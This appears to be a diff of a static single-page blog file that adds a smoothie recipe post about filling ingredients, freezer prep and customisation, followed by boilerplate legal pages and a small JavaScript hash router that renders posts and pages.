+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make Smoothies More Filling</h2>
+
+<p>A common mistake with smoothies is making them too light. A drink made only with fruit and water can taste refreshing, but it may not keep you full for long. To make a smoothie more satisfying, include ingredients that add texture, creaminess, and substance.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Oats</h3>
+
+<p>Oats are one of the easiest ways to make smoothies feel more like breakfast. They blend well with banana, berries, mango, and apples. They also help thicken the smoothie without changing the flavor too much.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use Yogurt or Milk</h3>
+
+<p>Yogurt creates a creamy texture and pairs especially well with blueberries and strawberries. Milk, almond milk, oat milk, and coconut milk can all be used depending on the flavor you want. Coconut milk works beautifully with mango and pineapple, while oat milk is excellent with banana and berries.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Include Banana for Natural Sweetness</h3>
+
+<p>Banana appears in many smoothie recipes for good reason. It adds natural sweetness, helps create a creamy texture, and blends easily with almost every fruit. If you want a colder, thicker smoothie, peel and freeze ripe bananas in slices.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> A balanced smoothie should not taste watery or flat. If the flavor feels weak, add more fruit. If the texture feels thin, add banana, oats, yogurt, or frozen fruit. If it feels too thick, add liquid a little at a time.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Easy Smoothie Prep Tips</h2>
+
+<p>Homemade smoothies become even easier when you prepare a few ingredients in advance. You do not need to meal prep an entire week if that feels overwhelming. Even small steps, such as washing berries or slicing bananas, can make mornings much faster.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Make Freezer Smoothie Packs</h3>
+
+<p>Freezer smoothie packs are a simple way to save time. Add chopped fruit to individual freezer bags or containers, then label each one with the smoothie name. In the morning, pour the frozen fruit into the blender, add liquid, oats, yogurt, or milk, and blend.</p>
+
+<ul>
+  <li><strong>Green pack:</strong> kiwi, green apple, banana, spinach</li>
+  <li><strong>Tropical pack:</strong> mango, pineapple, apple</li>
+  <li><strong>Berry pack:</strong> blueberries and banana</li>
+  <li><strong>Strawberry pack:</strong> strawberries and banana</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Keep Oats Ready</h3>
+
+<p>Store rolled oats in a small jar near your blender so they are easy to scoop. This makes it more likely that you will add them consistently. For an extra smooth texture, you can pulse oats into a finer texture before storing them.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Freeze Ripe Bananas</h3>
+
+<p>When bananas become ripe, peel them, slice them, and freeze them in a container. Frozen bananas are one of the best ingredients for creamy smoothies. They help reduce food waste and make smoothies taste naturally sweeter.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Customize These Smoothie Recipes</h2>
+
+<p>The best smoothie recipes are flexible. Once you understand the basic structure, you can adjust each one based on your taste, pantry, and nutrition goals. Small changes can completely transform the flavor while keeping the recipe easy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Make Them Dairy-Free</h3>
+
+<p>Each smoothie can be made dairy-free by using almond milk, oat milk, coconut milk, soy milk, or another plant-based option. For the blueberry smoothie, replace yogurt with dairy-free yogurt or use extra banana for creaminess.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Adjust the Sweetness</h3>
+
+<p>Ripe fruit is usually enough to sweeten a smoothie. Bananas, mangoes, and strawberries can all add natural sweetness. If your fruit is not very sweet, a small drizzle of honey or maple syrup can help, but it is best to taste before adding anything extra.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Turn Them Into Smoothie Bowls</h3>
+
+<p>To make a smoothie bowl, use less liquid and more frozen fruit. Blend until thick, then spoon the smoothie into a bowl. Top it with sliced fruit, oats, granola, coconut flakes, or seeds. Strawberry, blueberry, and mango smoothies work especially well as bowls because their colors look beautiful with toppings.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Common Smoothie Mistakes to Avoid</h2>
+
+<p>Even simple smoothies can go wrong if the balance is off. The good news is that most smoothie problems are easy to fix. A few small adjustments can improve flavor, texture, and consistency.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Adding Too Much Liquid</h3>
+
+<p>Too much liquid can make a smoothie thin and less flavorful. Start with a smaller amount, blend, then add more only if needed. This gives you more control over the final texture.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Using Only Fruit</h3>
+
+<p>Fruit gives smoothies great flavor, but fruit alone may not create enough creaminess or staying power. Add oats, yogurt, milk, or banana to create a more balanced drink.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Forgetting Texture</h3>
+
+<p>Texture matters just as much as flavor. Frozen fruit creates thickness, yogurt adds creaminess, oats add body, and liquid helps everything blend smoothly. When these elements work together, the smoothie feels more enjoyable and complete.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Freshest flavor:</strong> Green Glow with kiwi and green apple.</li>
+    <li><strong>Brightest tropical taste:</strong> Sunrise Mango with mango and pineapple.</li>
+    <li><strong>Creamiest berry option:</strong> Blueberry Rush with yogurt and banana.</li>
+    <li><strong>Most classic combination:</strong> Strawberry Cream with banana and milk.</li>
+    <li><strong>Best texture booster:</strong> Rolled oats blended with the liquid first.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Simple Smoothies That Make Healthy Eating Easier</h2>
+
+<p>These four easy smoothie ideas prove that healthy recipes do not have to be complicated to be delicious. With colorful fruit, creamy bases, and simple add-ins like oats, you can create smoothies that are quick, nourishing, and enjoyable enough to make part of your regular routine.</p>
+
+<p>The Green Glow smoothie is crisp and refreshing, the Sunrise Mango smoothie is bright and tropical, the Blueberry Rush smoothie is creamy and berry-rich, and the Strawberry Cream smoothie is sweet, familiar, and satisfying. Together, they offer a simple set of breakfast ideas that can fit different moods, seasons, and cravings.</p>
+
+<p>Whether you are trying to make mornings easier, add more fruit to your day, or build a collection of quick homemade smoothie recipes, these blends are a practical place to start. Keep your favorite fruits ready, freeze ripe bananas, stock a jar of oats, and choose a liquid you love. With just a few ingredients and a blender, a fresh smoothie can be ready in minutes.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Smoothie Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Breakfast Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Fruit Smoothies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Easy Morning Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Oat Smoothies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Banana Smoothie</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Smoothie Meal Prep</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Drinks</span>
+</div>
+
+                `
+            },
+
+           
+        ];
+
+        // Static Legal Pages (Exact content and AdSense validation kept intact)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Core Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Katy's Recipes";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // Placeholder path
+
+        // Function to render home list
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=100&h=100&fit=crop&auto=format&q=80'">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=800&h=500&fit=crop&q=80'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 2px; font-size: 1.1rem; color: var(--accent-color);">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render static legal page
+        function renderPage(pageId) {
+            const page = pages[pageId];
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 10px; padding-bottom: 10px;">
+                        <h1 style="font-family: 'Fraunces', serif; font-size: 2.3rem; margin-bottom: 30px;">${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Function to render single post detail view
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=100&h=100&fit=crop&auto=format&q=80'">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=800&h=500&fit=crop&q=80'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 2px; font-size: 1.1rem; color: var(--accent-color);">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Client-side router logic
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Back/Forward button history handlers
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load routing checks
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+</html>
